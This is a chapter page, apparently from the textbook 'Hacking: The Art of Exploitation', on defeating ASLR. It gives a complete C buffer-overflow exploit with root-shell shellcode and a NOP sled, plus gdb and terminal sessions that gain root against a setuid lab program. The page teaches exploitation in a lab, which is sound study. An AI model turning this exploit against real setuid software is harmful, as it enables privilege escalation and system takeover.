<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x6c5 Playing the Odds</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part161.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part163.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark149">0x6c5 Playing the Odds</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">Using <span class="s31">execl() </span>at least limits the randomness and gives us a ballpark address range. The remaining uncertainty can be handled with a NOP sled. A quick examination of aslr_demo shows that the overflow buffer needs to be 80 bytes to overwrite the stored return address on the stack.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1210.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q ./aslr_demo</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) run $(perl -e &#39;print &quot;AAAA&quot;x19 . &quot;BBBB&quot;&#39;)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /home/reader/booksrc/aslr_demo $(perl -e &#39;print &quot;AAAA&quot;x19 . &quot;BBBB&quot;&#39;) buffer is at 0xbfc7d3b0</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Program received signal SIGSEGV, Segmentation fault. 0x42424242 in ?? ()</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb) p 20*4</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 80</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) quit</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">The program is running. Exit anyway? (y or n) y reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1211.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Since we will probably want a rather large NOP sled, in the following exploit the NOP sled and the shellcode will be put after the return address overwrite. This allows us to inject as much of a NOP sled as needed. In this case, a thousand bytes or so should be sufficient.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">aslr_execl_exploit.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1212.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">#include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">char shellcode[]= &quot;\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68&quot; &quot;\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89&quot; &quot;\xe1\xcd\x80&quot;; // Standard shellcode</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;text-align: left;">int main(int argc, char *argv[]) { unsigned int i, ret, offset; char buffer[1000];</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 21pt;text-align: left;">printf(&quot;i is at %p\n&quot;, &amp;i); if(argc &gt; 1) // Set offset.</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;text-align: left;">offset = atoi(argv[1]);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">ret = (unsigned int) &amp;i - offset + 200; // Set return address. printf(&quot;ret addr is %p\n&quot;, ret);</p><p class="s31" style="padding-top: 2pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">for(i=0; i &lt; 90; i+=4) // Fill buffer with return address.</p><p class="s31" style="padding-left: 104pt;text-indent: 12pt;text-align: left;">*((unsigned int *)(buffer+i)) = ret; memset(buffer+84, 0x90, 900); // Build NOP sled. memcpy(buffer+900, shellcode, sizeof(shellcode));</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 104pt;text-indent: 0pt;text-align: left;">execl(&quot;./aslr_demo&quot;, &quot;aslr_demo&quot;, buffer, NULL);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1213.png"/></span></p><p style="padding-top: 6pt;padding-left: 109pt;text-indent: 0pt;text-align: left;">This code should make sense to you. The value <span class="s31">200 </span>is added to the return</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;">address to skip over the first 90 bytes used for the overwrite, so execution lands somewhere in the NOP sled.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1214.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ sudo chown root ./aslr_demo reader@hacking:~/booksrc $ sudo chmod u+s ./aslr_demo reader@hacking:~/booksrc $ gcc aslr_execl_exploit.c reader@hacking:~/booksrc $ ./a.out</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">i is at 0xbfa3f26c</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">ret addr is 0xb79f6de4 buffer is at 0xbfa3ee80 Segmentation fault</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0xbfa3f26c - 0xbfa3ee80&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 1004</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./a.out 1004 i is at 0xbfe9b6cc</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">ret addr is 0xbfe9b3a8 buffer is at 0xbfe9b2e0 sh-3.2# exit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">exit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./a.out 1004 i is at 0xbfb5a38c</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">ret addr is 0xbfb5a068 buffer is at 0xbfb20760 Segmentation fault</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q --batch -ex &quot;p 0xbfb5a38c - 0xbfb20760&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 236588</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./a.out 1004 i is at 0xbfce050c</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">ret addr is 0xbfce01e8 buffer is at 0xbfce0130 sh-3.2# whoami</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">root sh-3.2#</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1215.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;text-align: justify;">As you can see, occasionally the randomization causes the exploit to fail, but it only needs to succeed once. This leverages the fact that we can try the exploit as many times as we want. The same technique will work with the note- search exploit while ASLR is running. Try writing an exploit to do this.</p><p style="padding-left: 91pt;text-indent: 17pt;text-align: left;">Once the basic concepts of exploiting programs are understood, countless variations are possible with a little bit of creativity. Since the rules of a program are defined by its creators, exploiting a supposedly secure program is simply a matter of beating them at their own game. New clever methods, such as stack guards and IDSs, try to compensate for these problems, but these solutions aren’t perfect either. A hacker’s ingenuity tends to find holes in these systems. Just think of the things they didn’t think of.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part161.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part163.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
